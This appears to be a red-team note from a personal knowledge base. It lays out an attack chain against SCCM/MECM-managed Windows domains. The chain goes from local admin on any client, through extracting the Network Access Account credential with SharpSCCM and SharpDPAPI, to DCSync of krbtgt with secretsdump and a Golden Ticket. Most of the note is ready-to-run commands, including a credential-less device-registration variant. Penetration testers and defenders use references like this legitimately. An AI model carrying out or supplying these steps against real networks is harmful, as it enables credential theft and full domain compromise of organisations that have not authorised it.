---
title: "Attack Path: SCCM Client → Network Access Account → Domain Admin"
type: note
created: 2026-06-13
updated: 2026-06-13
tags: [attack-path, active-directory, sccm, credential-access, lateral-movement]
---

# Attack Path: SCCM Client → Network Access Account → Domain Admin

SCCM/MECM clients carry a Network Access Account (NAA) credential so they
can reach Distribution Points before domain-joining or while unauthenticated.
That credential is frequently over-scoped (sometimes literally Domain Admin)
and is recoverable by anyone who gets local admin on *any* managed
endpoint — including a low-value workstation.

## Chain

```
You (local admin on any SCCM-managed workstation)
  --SharpDPAPI / SharpSCCM local secrets--> recover Network Access Account creds
  --NAA is over-scoped (common misconfig)--> NAA = Domain Admin / has DCSync rights
  --secretsdump.py--> krbtgt -> Golden Ticket
```

## Step 0 — Confirm the box is SCCM-managed and you have local admin
```powershell
Get-Service -Name ccmexec      # SCCM client service
SharpSCCM.exe local triage      # quick check for cached policy/secrets
```

## Step 1 — Extract the Network Access Account credential
```powershell
# WMI method - read active policy secrets
SharpSCCM.exe local secrets -m wmi

# Disk method - parses CIM repository, can recover *historical* NAA creds
# even if rotated, since old policy blobs often remain on disk
SharpSCCM.exe local secrets -m disk

# DPAPI method - decrypts the NAA blob directly
SharpDPAPI.exe sccm
```
See [[sccm-abuse]].

## Step 2 — Check what the NAA can actually do
```bash
# Validate the cred and check group membership / rights
crackmapexec smb <dc-ip> -u NAA_USER -p 'NAA_PASS' --groups
bloodhound-python -u NAA_USER -p 'NAA_PASS' -d corp.local -c All -ns <dc-ip>
```
NAA accounts are scoped for *reading* Distribution Point shares, but in
practice are often domain-wide service accounts with broad group
memberships (sometimes Domain Admins directly, sometimes DCSync rights via
[[acl-abuse]]-style ACEs).

## Step 3a — If NAA is Domain Admin (or has DCSync)
```bash
secretsdump.py -just-dc-user krbtgt 'corp.local/NAA_USER:NAA_PASS@dc01.corp.local'
```
See [[dcsync]], [[golden-silver-tickets]] for the Golden Ticket finish.

## Step 3b — If NAA is only "Domain Users + extra share access"
Use it as a lateral-movement credential to reach more Distribution Points /
Management Points, then repeat: every new box you can read NAA creds from
might have a *different*, more-privileged NAA configured per boundary group.
Also check Task Sequence Variables and Collection Variables on those shares
for embedded admin creds.

## No local admin yet? Credential-less alternative
If you don't have local admin on any client but can register a new device
(default Machine Account Quota > 0, same primitive as
[[kerberos-delegation-abuse|RBCD]]):
```bash
SharpSCCM.exe get secrets -u 'DOMAIN\NEWDEVICE$' -p 'Password123' -r NEWDEVICE -ip <MP_IP>
```

## Related
- [[sccm-abuse]] — full SCCM attack surface, PXE/Client-Push paths too
- [[dcsync]], [[golden-silver-tickets]] — step 3a finish
- [[kerberos-delegation-abuse]] — Machine Account Quota primitive for the credential-less variant
- [[ntlm-relay-coercion]] — Client Push coercion is an alternative entry point that doesn't need any client compromise at all
